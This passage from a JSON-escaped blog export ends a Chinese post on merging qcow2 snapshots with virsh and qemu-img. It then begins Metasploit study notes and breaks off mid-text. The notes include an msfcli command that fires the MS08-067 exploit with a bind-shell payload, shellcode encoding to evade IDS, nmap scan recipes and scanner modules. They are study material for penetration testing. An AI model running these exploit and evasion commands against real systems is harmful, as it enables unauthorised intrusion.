\u5982\u679c\u624b\u5de5\u6267\u884c*qemu-img*\u547d\u4ee4\u5b8c\u6210\u7684\u8bdd, \u73b0\u5728\u8fd8\u53ea\u80fd\u7528method-b.\\nFigure-4\\n\\n```\\n.------------.  .------------.  .------------.  .------------.  .------------.\\n|            |  |            |  |            |  |            |  |            |\\n| RootBase   <---  Snap-1    <---  Snap-2    <---  Snap-3    <---  Snap-4    |\\n|            |  |            |  |            |  |            |  | (Active)   |\\n\'------------\'  \'------------\'  \'------------\'  \'------------\'  \'------------\'\\n                  /                  |             |\\n                 /                   |             |\\n                /                    |             |\\n   commit data /         commit data |             |\\n              /                      |             |\\n             /                       | commit data |\\n            v                        |             |\\n.------------.<----------------------|-------------\'            .------------.\\n|            |<----------------------\'                          |            |\\n| RootBase   |                                                  |  Snap-4    |\\n|            |<-------------------------------------------------| (Active)   |\\n\'------------\'                  Backing File                    \'------------\'\\n```\\n\\n\u4e0a\u56fe\u6f14\u793a\u4e86case1\u7684blockcommit\u8d70\u5411\uff0c\u73b0\u5728sn4\u7684backing file\u6307\u5411rootbase.\\n\\n### blockpull\\n\\nblockpull\uff08qemu\u4e2d\u4e5f\u79f0\u4f5c\'block stream\'\uff09\u53ef\u4ee5\u5c06backing\u5408\u5e76\u81f3active\uff0c\u4e0eblockcommit\u6b63\u597d\u76f8\u53cd.\u622a\u6b62\u76ee\u524d\u53ea\u80fd\u5c06backing file\u5408\u5e76\u81f3\u5f53\u524d\u4f7f\u7528\u7684active\u4e2d\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd8\u4e0d\u652f\u6301\u6307\u5b9atop\u7684\u5408\u5e76.\\n\u8bbe\u60f3\u4e00\u4e2a\u4e0b\u9762\u7684\u573a\u666f:\\n\\nFigure-5\\n\\n```\\n.------------.  .------------.  .------------.  .------------.  .------------.\\n|            |  |            |  |            |  |            |  |            |\\n| RootBase   <---  Snap-1    <---  Snap-2    <---  Snap-3    <---  Snap-4    |\\n|            |  |            |  |            |  |            |  | (Active)   |\\n\'------------\'  \'------------\'  \'------------\'  \'------------\'  \'------------\'\\n                         |                 |              \\\\\\n                         |                 |               \\\\\\n                         |                 |                \\\\\\n                         |                 |                 \\\\ stream data\\n                         |                 | stream data      \\\\\\n                         | stream data     |                   \\\\\\n                         |                 |                    v\\n     .------------.      |                 \'---------------\x3e  .------------.\\n     |            |      \'---------------------------------\x3e  |            |\\n     | RootBase   |                                           |  Snap-4    |\\n     |            | <---------------------------------------- | (Active)   |\\n     \'------------\'                 Backing File              \'------------\'\\n```\\n\\n\u4f7f\u7528blockpull\u6211\u4eec\u53ef\u4ee5\u5c06snap-1/2/3\u4e2d\u7684\u6570\u636e\u5408\u5e76\u81f3active\u5c42\uff0c\u6700\u7ec8rootbase\u5c06\u53d8\u6210active\u7684\u76f4\u63a5\u540e\u7aef.\\n\\n\u547d\u4ee4\u5982\u4e0b:\\n\\n\u5047\u8bbe\u5feb\u7167\u5df2\u7ecf\u4f7f\u7528 \u521b\u5efaSnapshots \u5c0f\u8282\u4e2d\u7684\u65b9\u5f0f\u5b8c\u6210:\\n\\n\u5982*Figure-5*\u4e2d\u63cf\u8ff0\u7684-- ```[RootBase] <- [Active]```.\\n\\n```\\n# virsh blockpull --domain RootBase  \\\\\\n  --path /var/lib/libvirt/images/active.qcow2  \\\\\\n  --base /var/lib/libvirt/images/RootBase.qcow2  \\\\\\n  --wait --verbose\\n```\\n\\n\u540e\u7eed\u7684\u5de5\u4f5c\u662f\u6211\u4eec\u9700\u8981\u4f7f\u7528virsh\u6765\u6e05\u7406\u6389\u4e0d\u7528\u7684\u5feb\u7167\\n\\n```\\n# virsh snapshot-delete --domain RootBase Snap-3 --metadata\\n# virsh snapshot-delete --domain RootBase Snap-2 --metadata\\n# virsh snapshot-delete --domain RootBase Snap-1 --metadata\\n```\\n\\nFigure-6\\n\\n```\\n.------------.  .------------.  .------------.  .------------.  .------------.\\n|            |  |            |  |            |  |            |  |            |\\n| RootBase   <---  Snap-1    <---  Snap-2    <---  Snap-3    <---  Snap-4    |\\n|            |  |            |  |            |  |            |  | (Active)   |\\n\'------------\'  \'------------\'  \'------------\'  \'------------\'  \'------------\'\\n      |                  |              |                  \\\\\\n      |                  |              |                   \\\\\\n      |                  |              |                    \\\\  stream data\\n      |                  |              | stream data         \\\\\\n      |                  |              |                      \\\\\\n      |                  | stream data  |                       \\\\\\n      |  stream data     |              \'------------------\x3e     v\\n      |                  |                                    .--------------.\\n      |                  \'---------------------------------\x3e  |              |\\n      |                                                       |  Snap-4      |\\n      \'----------------------------------------------------\x3e  | (Active)     |\\n                                                              \'--------------\'\\n                                                                \'Standalone\'\\n                                                                (w/o backing\\n                                                                file)\\n```\\n\\n\u4e0a\u56fe\u8868\u793a\u7684\u662f\u5c06\u6240\u6709backing file\u5168\u90e8\u5408\u5e76\u81f3active\\n\\n\u5982\u4e0b\u6267\u884c\u547d\u4ee4:\\n\\n(1) \u5728\u6211\u4eec\u6267\u884c\u5408\u5e76 *\u4e4b\u524d* \u67e5\u770b\u4e00\u4e0b\u5feb\u7167\u7684\u5927\u5c0f(\u6ce8\u610f\u89c2\u5bdf\'Active\'):\\n    ::\\n```\\n        # ls -lash /var/lib/libvirt/images/RootBase.img\\n        608M -rw-r--r--. 1 qemu qemu 1.0G Oct 11 17:54 /var/lib/libvirt/images/RootBase.img\\n\\n        # ls -lash /var/lib/libvirt/images/*Snap*\\n        840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2\\n        392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2\\n        456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2\\n        2.9M -rw-------. 1 qemu qemu 3.0M Oct 11 18:10 /var/lib/libvirt/images/Active.qcow2\\n```\\n(2) \u5355\u72ec\u68c0\u67e5\u4e0b \'Active\' \u6240\u6307\u5411\u7684backing file ::\\n```\\n        # qemu-img info /var/lib/libvirt/images/Active.qcow2\\n        image: /var/lib/libvirt/images/Active.qcow2\\n        file format: qcow2\\n        virtual size: 1.0G (1073741824 bytes)\\n        disk size: 2.9M\\n        cluster_size: 65536\\n        backing file: /var/lib/libvirt/images/Snap-3.qcow2\\n```\\n(3) \u5f00\u59cb **blockpull** \u64cd\u4f5c.\\n    ::\\n```\\n        # virsh blockpull --domain ptest2-base --path /var/lib/libvirt/images/Active.qcow2 --wait --verbose\\n        Block Pull: [100 %]\\n        Pull complete\\n```\\n(4) \u518d\u68c0\u67e5\u4e0b\u5feb\u7167\u5927\u5c0f\uff0c \'Active\'\u53d8\u5f97\u5f88\u5927\\n    ::\\n```\\n        # ls -lash /var/lib/libvirt/images/*Snap*\\n         840K -rw-------. 1 qemu qemu 896K Oct 11 17:56 /var/lib/libvirt/images/Snap-1.qcow2\\n         392K -rw-------. 1 qemu qemu 448K Oct 11 17:56 /var/lib/libvirt/images/Snap-2.qcow2\\n         456K -rw-------. 1 qemu qemu 512K Oct 11 17:56 /var/lib/libvirt/images/Snap-3.qcow2\\n        1011M -rw-------. 1 qemu qemu 3.0M Oct 11 18:29 /var/lib/libvirt/images/Active.qcow2\\n```\\n\\n(5) \u68c0\u67e5\'Active\'\u4fe1\u606f\uff0c\u73b0\u5728\u5b83\u5df2\u7ecf\u4e0d\u9700\u8981backing file\u4e86\uff0c\u6b63\u5982*Figure-6*\u6240\u793a::\\n```\\n        # qemu-img info /var/lib/libvirt/images/Active.qcow2\\n        image: /var/lib/libvirt/images/Active.qcow2\\n        file format: qcow2\\n        virtual size: 1.0G (1073741824 bytes)\\n        disk size: 1.0G\\n        cluster_size: 65536\\n```\\n(6) \u6e05\u7406\u73b0\u573a\\n    ::\\n```\\n        # virsh snapshot-delete --domain RootBase Snap-3 --metadata\\n```\\n(7) \u73b0\u5728\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b guestfish  **READ-ONLY**  \u6a21\u5f0f\u6765\u68c0\u67e5\u4e0b\u78c1\u76d8\u5185\u5bb9( *--ro* \u9009\u9879)\\n    ::\\n```\\n        # guestfish --ro -i -a /var/lib/libvirt/images/Active.qcow2\\n```\\n\u5feb\u7167\u5220\u9664 (and \'offline commit\')\\n\\n\u5220\u9664\uff08live/offline\uff09\u72b6\u6001\u7684*\u5185\u7f6e\u5feb\u7167*\u5f88\u65b9\u4fbf ::\\n```\\n# virsh snapshot-delete --domain f17vm --snapshotname snap6\\n```\\n[OR]\\n```\\n# virsh snapshot-delete f17vm snap6\\n```\\nlibvirt\u73b0\u5728\u8fd8\u6ca1\u6709\u5220\u9664\u5916\u7f6e\u5feb\u7167\u7684\u529f\u80fd\uff0c\u4f46\u662f\u53ef\u4ee5\u4f7f\u7528*qemu-img*\u547d\u4ee4\u6765\u5b8c\u6210.\\n\\n\u6bd4\u5982\u6211\u4eec\u6709\u8fd9\u6837\u4e00\u6761\u94fe(VM*offline*\u72b6\u6001): ```base <- sn1 <- sn2 <- sn3```\\n\\n\u73b0\u5728\u5220\u9664\u7b2c\u4e8c\u4e2a\u5feb\u7167(sn2).\u6709\u4e24\u79cd\u65b9\u5f0f:\\n\\n```\\n* Method (1): base <- sn1 <- sn3 (by copying sn2 into sn1)\\n* Method (2): base <- sn1 <- sn3 (by copying sn2 into sn3)\\n```\\n\\nMethod (1)\\n\\n(by copying sn2 into sn1)\\n\\n\u6ce8\u610f: \u5fc5\u987b\u4fdd\u8bc1sn1\u6ca1\u6709\u88ab\u5176\u4ed6\u5feb\u7167\u4f5c\u4e3a\u540e\u7aef,\u4e0d\u7136\u5c31\u6302\u4e86!!\\n\\noffline commit\\n\\n```\\n# qemu-img commit sn2.qcow2\\n```\\n\\n\u5c06\u4f1a*commit*\u6240\u6709\u5728sn2\u4e2d\u7684\u6539\u52a8\u5230sn2\u7684backing file(sn1).\\nqemu-img commit\u548cvirsh blockcommit\u7c7b\u4f3c\\n\u73b0\u5728\u628asn3\u7684\u540e\u7aef\u6307\u5411\u5230sn1.\\n\\n```\\n# qemu-img rebase -u -b sn1.qcow2 sn3.qcow2\\n```\\n\\n\u6ce8\u610f: -u\u4ee3\u8868\'Unsafe mode\' -- \u6b64\u6a21\u5f0f\u4e0b\u4ec5\u4ec5\u4fee\u6539\u4e86\u6307\u5411\u5230\u7684backing file\u540d\u5b57\uff0c\u5fc5\u987b\u8c28\u614e\u64cd\u4f5c.\\n\u73b0\u5728\u53ef\u4ee5\u76f4\u63a5\u5220\u9664sn2\\n```\\n# rm sn2.qcow2\\n```\\n\\nMethod (2)\\n\\n(by copying sn2 into sn3)\\n\\n\u5408\u5e76\u6570\u636e\uff0crebase\u540e\u7aef:\\n```\\n# qemu-img rebase -b sn1.qcow2 sn3.qcow2\\n```\\n\u672a\u4f7f\u7528-u\u6a21\u5f0f\u7684rebase\u5c06\u628a\u6570\u636e\u4e5f\u4e00\u5e76\u5408\u5e76\u8fc7\u53bb\uff0c\u5373sn2\u7684\u6570\u636e\u5199\u5165\u5230sn3.\\n\u6362\u8a00\u4e4b: \u8fd9\u91cc\u4f7f\u7528\u7684\'Safe mode\',\u4e5f\u662f\u9ed8\u8ba4\u6a21\u5f0f --\u5bf9sn3\u800c\u8a00\u4efb\u4f55\u4ece\\nqemu-img rebase(\u6ca1\u6709-u)\u548c\u548cvirsh blockpull\u7c7b\u4f3c.\\nbackingfile\uff08sn1\uff09\u5230\u65e7\u7684backingfile\uff08sn2\uff09\u4e4b\u95f4\u53d1\u751f\u7684\u5dee\u5f02\u6539\u52a8\u90fd\u5c06\u88ab\u5408\u5e76\u5230sn3\u4e2d.\\n\\n\u73b0\u5728\u53ef\u4ee5\u5220\u9664sn2\u4e86\\n```\\n# rm sn2.qcow2\\n```"},{"id":"/2012/11/12/msf-study-note","metadata":{"permalink":"/notes/blog/2012/11/12/msf-study-note","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2012-11-12-msf-study-note.md","source":"@site/blog/2012-11-12-msf-study-note.md","title":"metasploit\u5b66\u4e60\u7b14\u8bb0","description":"msf study note","date":"2012-11-12T00:00:00.000Z","tags":[{"inline":true,"label":"msf","permalink":"/notes/blog/tags/msf"},{"inline":true,"label":"security","permalink":"/notes/blog/tags/security"}],"readingTime":33.42,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"metasploit\u5b66\u4e60\u7b14\u8bb0","description":"msf study note","categories":["sec"],"tags":["msf","security"]},"unlisted":false,"prevItem":{"title":"\u6d45\u6790qcow2\u955c\u50cf\u6587\u4ef6\u7684\u5feb\u7167\u5408\u5e76","permalink":"/notes/blog/2012/11/23/libvirt-snapshot-blockcommit-blockpull"},"nextItem":{"title":"libvirt\u4e2dstorage pool\u7684\u7ba1\u7406","permalink":"/notes/blog/2012/07/13/libvirt-storage-pool"}},"content":"> N\u5e74\u524d\u4f7f\u7528metasploit\u6846\u67b6\u8fc7\u7a0b\u4e2d\u5199\u4e0b\u7684\u5b66\u4e60\u7b14\u8bb0\\n\\n\\n## \u4e00\uff0e\u540d\u8bcd\u89e3\u91ca\\n\\n- exploit: \u6d4b\u8bd5\u8005\u5229\u7528\u5b83\u6765\u653b\u51fb\u4e00\u4e2a\u7cfb\u7edf\uff0c\u7a0b\u5e8f\uff0c\u6216\u670d\u52a1\uff0c\u4ee5\u83b7\u5f97\u5f00\u53d1\u8005\u610f\u6599\u4e4b\u5916\u7684\u7ed3\u679c\u3002\u5e38\u89c1\u7684 \u6709\u5185\u5b58\u6ea2\u51fa\uff0c\u7f51\u7ad9\u7a0b\u5e8f\u6f0f\u6d1e\u5229\u7528\uff0c\u914d\u7f6e\u9519\u8befexploit\u3002\\n\\n- payload: \u6211\u4eec\u60f3\u8ba9\u88ab\u653b\u51fb\u7cfb\u7edf\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u5982reverse shell\u53ef\u4ee5\u4ece\u76ee\u6807\u673a\u5668\u4e0e\u6d4b\u8bd5\u8005\u4e4b\u95f4\u5efa\u7acb\u4e00 \u4e2a\u53cd\u54cd\u8fde\u63a5\uff0cbind shell \u7ed1\u5b9a\u4e00\u4e2a\u6267\u884c\u547d\u4ee4\u7684\u901a\u9053\u81f3\u6d4b\u8bd5\u8005\u7684\u673a\u5668\u3002payload\u4e5f\u53ef\u4ee5\u662f\u53ea \u80fd\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u6709\u9650\u547d\u4ee4\u7684\u7a0b\u5e8f\u3002\\n\\n- shellcode: \u662f\u8fdb\u884c\u653b\u51fb\u65f6\u7684\u4e00\u7cfb\u5217\u88ab\u5f53\u4f5cpayload\u7684\u6307\u4ee4\uff0c\u901a\u5e38\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u4e4b\u540e\u63d0\u4f9b\u4e00\u4e2a\u53ef \u6267\u884c\u547d\u4ee4\u7684shell\u3002\\n\\n- module: MSF\u7684\u6a21\u5757\uff0c\u7531\u4e00\u7cfb\u5217\u4ee3\u7801\u7ec4\u6210\u3002\\n\\n- listener: \u7b49\u5f85\u6765\u81ea\u88ab\u653b\u51fb\u673a\u5668\u7684incoming\u8fde\u63a5\u7684\u76d1\u542c\u5728\u6d4b\u8bd5\u8005\u673a\u5668\u4e0a\u7684\u7a0b\u5e8f\u3002\\n\\n## \u4e8c\uff0eMSF\u57fa\u7840\\n\\n### \u542f\u52a8msf\\n1\u3001MSF\u63d0\u4f9b\u591a\u79cd\u7528\u6237\u754c\u9762\uff1a\u63a7\u5236\u53f0\u6a21\u5f0f\uff08msfconsole\uff09\uff0c\u547d\u4ee4\u884c\u6a21\u5f0f\uff08msfcli\uff09\uff0c\u56fe\u5f62\u6a21\u5f0f\uff08msfgui\u3001armitage\uff09\uff0c\uff08\u5728\u8001\u7248\u672c\u4e2d\u8fd8\u6709web\u754c\u9762\u6a21\u5f0f\uff0c\u540e\u6765\u8c8c\u4f3c\u7531\u4e8e\u5b89\u5168\u56e0\u7d20\u88ab\u53d6\u6d88\u4e86\uff1f\uff09\u5176\u4e2dconsole\u6a21\u5f0f\u6700\u5e38\u7528\uff0c\u542f\u52a8\u65b9\u5f0f\uff1a\\n```\\ncd /opt/framework/msf3/\\nmsfconsole\\n```\\n\\n\u8fd0\u884c\u6b64\u547d\u4ee4\u540e\u5c06\u8fdb\u5165msf\u547d\u4ee4\u63d0\u793a\u7b26\uff1a\\n```\\nmsf>\\n```\\n\\n### \u83b7\u53d6\u5e2e\u52a9\u4fe1\u606f\\n2\u3001\u83b7\u53d6\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\uff1ahelp\\n\\n\u4f8b\u5b50\uff1a\\n```\\nhelp connect\\n```\\n\\n### msfcli\\n3\u3001msfcli \u548cmsfconsole\u76f8\u6bd4\u4e0d\u63d0\u4f9b\u4ea4\u4e92\u65b9\u5f0f\uff0c\u5b83\u76f4\u63a5\u4ece\u547d\u4ee4\u884c\u8f93\u5165\u6240\u6709\u53c2\u6570\u5e76\u4ea7\u751f\u7ed3\u679c\uff0c\\n\\n```\\nmsfcli \u2013h #\u83b7\u53d6\u5e2e\u52a9\u4fe1\u606f\\nmsfcli <exploit_name> <option=value> [mode]\\n```\\n\\n\\n```\\nmode:H\uff08help\uff09\u5e2e\u52a9\\n\\n   S\uff08summary\uff09\u663e\u793a\u6a21\u5757\u4fe1\u606f\\n\\n    O\uff08options\uff09\u663e\u793a\u6a21\u5757\u7684\u53ef\u7528\u9009\u9879\\n\\n     A\uff08advanced\uff09\u663e\u793a\u9ad8\u7ea7\u9009\u9879   \\n\\nI\uff08ids\uff09\u663e\u793aIDS EVASION \u9009\u9879\\n\\n     P\uff08payload\uff09\u663e\u793a\u6b64\u6a21\u5757\u53ef\u7528\u7684payload\\n\\nT\uff08targets\uff09\u663e\u793a\u53ef\u7528targets\\n\\nAC\uff08action\uff09\u663e\u793a\u53ef\u7528actions\\n\\nC\uff08check\uff09\u8fd0\u884c\u6a21\u5757\u6d4b\u8bd5\\n\\n   E\uff08execute\uff09\u6267\u884c\u9009\u5b9a\u7684\u6a21\u5757\\n```\\n\\n### \u6a21\u5757\u4f7f\u7528\u793a\u4f8b\\n\u4f8b\u5b50\uff1ams08_067_netapi\u6a21\u5757\\n\\n```\\nmsfcli windows/smb/ms08_067_netapi O    #\u67e5\u770b\u53ef\u7528\u9009\u9879\\nmsfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 P #\u67e5\u770b\u53ef\u7528payload\\nmsfcli windows/smb/ms08_067_netapi RHOST=192.168.0.111 PAYLOAD=windows/shell/bind_tcp E   #\u6267\u884c \uff08\u6b64\u5904O\u3001P \u7b49\u53c2\u6570\u4e5f\u53ef\u4ee5\u7528\u5c0f\u5199\uff09\\n```\\n\\n### armitage\u4f7f\u7528\\n4\u3001Armitage :MSF\u7684\u4e00\u4e2a\u56fe\u5f62\u63a5\u53e3\\n\\n\u8fd0\u884c\u65b9\u5f0f\uff1a\\n\\n```\\ncd /opt/farmework/msf3/\\narmitage\\n```\\n\\n### msf\u5176\u4ed6\u7ec4\u4ef6\\n5\u3001MSF\u5176\u4ed6\u7ec4\u4ef6\uff1a\\n\\n- MSFpayload\u5de5\u5177\uff1a\\n\\n\u7528\u4e8e\u751f\u6210shellcode\uff0c\u53ef\u751f\u6210C,Ruby\uff0cJaveScript\uff0cVB\u683c\u5f0f\u7684shellcode\u3002\\n\u5e2e\u52a9\u4fe1\u606f\uff1a\\n\\n```\\nmsfpayload \u2013h\\n```\\n- MSFencode\u5de5\u5177\uff1a\\n\\n\u7f16\u7801\u538b\u7f29shellcode\uff0c\u8fc7IDS ,\u9632\u706b\u5899\u3002\\n```\\nmsfencode -h\\nmsfencode \u2013l \u67e5\u770b\u53ef\u7528\u7684\u7f16\u7801\u5668\uff08encoders\uff09\uff0c\u6548\u679c\u6700\u4f73\u7684\u662fx86/shikata_ga_nai\\n```\\n\\n## \u4e09\uff0e\u4fe1\u606f\u523a\u63a2\u4e0e\u6536\u96c6\\n\\n### 1\u3001\u653b\u51fb\u7b2c\u4e00\u6b65\uff1a\u57fa\u7840\u4fe1\u606f\u6536\u96c6\\n\\nwhois\u67e5\u8be2\uff1a\\n\\n```\\nmsf > whois example.com\\nmsf> whois 192.168.1.100\\n```\\n\\nhttp://searchdns.netcraft.com/\u5728\u7ebf\u6536\u96c6\u670d\u52a1\u5668IP\u4fe1\u606f\u5de5\u5177\\n\\n```\\nnslookup\\nset type=mx\\n> example.com\\n```\\n\\n### 2\u3001\u7528nmap\u63a2\u6d4b\u5f00\u653e\u7aef\u53e3\u548c\u670d\u52a1\uff1a\\n-sS SYN\u534a\u5f00\u626b\u63cf  -sT TCP \u534a\u5f00\u626b\u63cf -Pn \u4e0d\u4f7f\u7528ping \u65b9\u5f0f\u63a2\u6d4b\u4e3b\u673a  -A \u63a2\u6d4b\u670d\u52a1\u7c7b\u578b -6 \u5f00\u542fIPV6\u626b\u63cf  -O \u63a2\u6d4b\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\\n\u5e38\u7528\u626b\u63cf\u53c2\u6570\u7ec4\u5408\uff1a\\n\\n```\\nnmap \u2013sS \u2013Pn 192.168.0.111\\nnmap \u2013sS \u2013Pn \u2013A 192.168.0.111 \\n```\\n\\n\u5176\u4ed6\u7ec4\u5408\uff1a\\n\\n```\\nnmap -T4 -A -v \u6df1\u5165\u5f0f\u626b\u63cf\\nnmap -sS -sU -T4 -A -v \u540c\u4e0a\uff0c\u4e14\u626bUDP\\nnmap -p 1-65535 -T4 -A -v  \u626b\u63cf\u6240\u6709TCP\u7aef\u53e3\\nnmap -T4 -A -v -Pn \u4e0d\u4f7f\u7528ping\\nnmap -sn \u4f7f\u7528ping\\nnmap -T4 -F \u5feb\u901f\u626b\u63cf\\nnmap -sV -T4 -O -F --version-light \u52a0\u5f3a\u7248\u5feb\u901f\u626b\u63cf\\nnmap -sn --traceroute \u5feb\u901f\u8def\u7531\u8ddf\u8e2a\u626b\u63cf\\nnmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script \\"default or (discovery and safe)\\" \u6162\u901f\u5168\u9762\u626b\u63cf\\n```\\n\\n\uff08nmap\u7684scripts\u4f4d\u4e8e/usr/local/share/nmap/scripts/\u76ee\u5f55\uff0c\u7528LUA\u8bed\u8a00\u7f16\u5199\uff0cnmap --script-help all | less \u67e5\u770b\u811a\u672c\u626b\u63cf\u5e2e\u52a9\u4fe1\u606f\uff09\\n\uff08nmap\u8fd8\u6709\u4e00\u4e2aGUI\u754c\u9762\u5de5\u5177\u53ebzenmap\uff0c\u547d\u4ee4zenmap\u6216nmapfe\u90fd\u53ef\u4ee5\u542f\u52a8\uff09\\n\\n\\n### 3\u3001MSF\u4e0epostgresql\u534f\u540c\u5de5\u4f5c\\n\\n```\\n/etc/init.d/postgreql-8.3 start\\nmsf> db_connect postgres:toor@127.0.0.1/msf\\nmsf> db_status\\n# \u5bfc\u5165nmap\u626b\u63cf\u7684\u7ed3\u679c\uff1a\\nnmap \u2013sS \u2013Pn \u2013A \u2013oX Subnet1 192.168.1.0/24   # -oX \u626b\u63cf\u7ed3\u679c\u5bfc\u51fa\u4e3aSubnet1.xml\\nmsf> db_import Subnet1.xml\\nmsf> db_hosts \u2013c address   #\u67e5\u770b\u5bfc\u5165\u7684\u4e3b\u673aIP \\n```\\n\\nmsf\u4e5f\u53ef\u4ee5\u548cmysql\u4e00\u8d77\u5de5\u4f5c\uff0c\u5728bt5 r1\u4e2dmsf\u9ed8\u8ba4\u652f\u6301\u8fde\u63a5mysql\uff1a\\n\\n```\\nmsf> db_driver mysql\\nmsf> db_connect root:toor@127.0.0.1/msf3 #\u8fde\u63a5\u672c\u673amysql\u7684msf3\u6570\u636e\u5e93\\nmysql\u9ed8\u8ba4\u5bc6\u7801toor\uff0c\u4f7f\u7528db_connect\u8fde\u63a5\u65f6\u4f1a\u81ea\u52a8\u521b\u5efamsf3\u5e93\uff09\\n```\\n\\n### 4\u3001\u9ad8\u7ea7\u626b\u63cf\u65b9\u5f0f\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/ip/ipidseq   #IPID\u5e8f\u5217\u626b\u63cf\u5668\uff0c\u4e0enmap\u7684-sI -O\u9009\u9879\u7c7b\u4f3c\\nshow options\\nset RHOSTS 192.168.1.0/24\\nset RPORT 8080\\nset THREADS 50\\nrun\\n```\\n\\n\uff08RHOSTS\u3001RPORT\u7b49\u53c2\u6570\u4e5f\u53ef\u4ee5\u7528\u5c0f\u5199\uff09\\n\\n\\n```\\nmsf> nmap \u2013PN \u2013sI 192.168.1.09 192.168.1.155\\n```\\n\\nnmap \u8fde\u63a5\u6570\u636e\u5e93\uff1a\\n\\n```\\nmsf> db_connect postgres:toor@127.0.0.1/msf\\nmsf> db_nmap \u2013sS \u2013A 192.168.1.111\\nmsf> db_services  #\u67e5\u770b\u626b\u63cf\u7ed3\u679c\\n```\\n\\n\u4f7f\u7528portscan\u6a21\u5757\uff1a\\n\\n```\\nmsf> search postscan\\nmsf> use scanner/postscan/syn\\nset RHOSTS 192.168.1.111\\nset THREADS 50\\nrun\\n```\\n\\n### 5\u3001\u7279\u5b9a\u626b\u63cf\uff1a\\n\\nsmb_version\u6a21\u5757\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/smb/smb_version\\nshow options\\nset RHOSTS 192.168.1.111\\nrun\\ndb_hosts \u2013c address,os_flavor\\n```\\n\\n\u67e5\u627emssql\u4e3b\u673a\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/mssql/mssql_ping\\nshow options\\nset RHOSTS 192.168.1.0/24\\nset THREADS 255\\nrun\\n```\\n\\nSSH\u670d\u52a1\u5668\u626b\u63cf\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/ssh/ssh_version \\nset THREADS 50\\nrun\\n```\\n\\nFTP\u4e3b\u673a\u626b\u63cf\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/ftp/ftp_version \\nshow options\\nset RHOSTS 192.168.1.0/24\\nset THREADS 255\\nrun\\n```\\n\\n\u626b\u63cfFTP\u533f\u540d\u767b\u5f55\uff1a\\n\\n```\\nuse auxiliary/scanner/ftp/anonymos\\nset RHOSTS 192.168.1.0/24\\nset THREADS 50\\nrun\\n```\\n\\n\u626b\u63cfSNMP\u4e3b\u673a\uff1a\\n\\n```\\nmsf> use auxiliary/scanner/snmp/snmp_login\\nset RHOSTS 192.168.1.0/24\\nset THREADS 50\\nrun\\n```\\n\\n### 6\u3001\u7f16\u5199\u81ea\u5b9a\u4e49\u626b\u63cf\u6a21\u5757\uff1a\\n\\nMSF\u6846\u67b6\u63d0\u4f9b\u5bf9\u5176\u6240\u6709exploit\u548cmethod\u7684\u8bbf\u95ee\uff0c\u652f\u6301\u4ee3\u7406\uff0cSSL\uff0c\u62a5\u544a\u751f\u6210\uff0c\u7ebf\u7a0b\uff0c \u4f7f\u7528Ruby\u8bed\u8a00\u3002\\n\\n\u4f8b\u5b50\uff1a\u4e00\u4e2a\u7b80\u5355\u7684\u81ea\u5b9a\u4e49\u626b\u63cf\u6a21\u5757\\n\\n```ruby\\n#Metasploit\\nrequire \u2018msf/core\u2019\\nclass Metasploit3 < Msf::Auxiliary\\ninclude Msf::Exploit::Remote::Tcp\\ninclude Msf:Auxiliary::Scanner\\ndef initialize\\nsuper(\\n    \u2018Name\u2019 => \u2018My custom TCP scan\u2019,\\n    \u2018Version\u2019 => \u2018$Revision: 1$\u2019,\\n    \u2018Description\u2019 => \u2018My quick scanner\u2019,\\n    \u2018Author\u2019 => \u2018Your name here\u2019,\\n    \u2018License\u2019 => \u2018MSF_LICENSE\u2019\\n)\\n\\nregister_options(\\n    [\\n    Opt::RPORT(12345)\\n    ],self.class)\\n\\nend\\n\\ndef run_host(ip)\\n    connect()\\n        sock.puts(\u2018HELLO SERVER\u2019)\\n        data = sock.recv(1024)\\n        print_status(\u201cReceived: #{data} from #{ip}\u201d)\\n        disconnect()\\n    end\\nend\\n```\\n\\n\\n\u6d4b\u8bd5\uff1a\u5c06\u6a21\u5757\u4fdd\u5b58\u5230modules/auxiliary/scanner/\u76ee\u5f55\u4e0b\u9762,\u547d\u540d\u4e3asimple_tcp.rb\uff0c\u6ce8\u610f\u4fdd\u5b58\u7684\u4f4d\u7f6e\u5f88\u91cd\u8981\u3002\\n\\n\u4f7f\u7528nc\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3\u6d4b\u8bd5\u8fd9\u4e2a\u6a21\u5757\uff1a\\n\\n```\\necho \u201cHello Metasploit\u201d > banner.txt\\nnc \u2013lvnp 12345 < banner.txt\\n```\\n\\n```\\nmsf> use auxiliary/scanner/simple_tcp\\n>show options\\n>set RHOSTS 192.168.1.111\\n>run\\n[*] Received: Hello Metasploit from 192.168.1.111\\n```\\n\\n## \u56db\uff0e\u57fa\u672c\u6f0f\u6d1e\u626b\u63cf\\n\\n### 1 \u57fa\u672c\u626b\u63cf\\n1\u3001\u4f7f\u7528nc\u4e0e\u76ee\u6807\u7aef\u53e3\u901a\u4fe1\uff0c\u83b7\u53d6\u76ee\u6807\u7aef\u53e3\u7684\u4fe1\u606f\uff1a\\n```\\nnc 192.168.1.111 80\\nGET HTTP 1/1\\nServer: Microsoft-IIS/5.1\\n```\\n\\n  1: \u8fd8\u6709\u4e00\u4e2a\u529f\u80fd\u4e0enc\u7c7b\u4f3c\u7684\u5de5\u5177Ncat\uff0c\u4ea7\u81eanmap\u793e\u533a\uff0c\u53ef\u5b9e\u73b0\u76f8\u540c\u529f\u80fd\uff1a\\n\\n```\\nncat -C 192.168.1.111 80\\nGET / HTTP/1.0\\n```\\n\\n  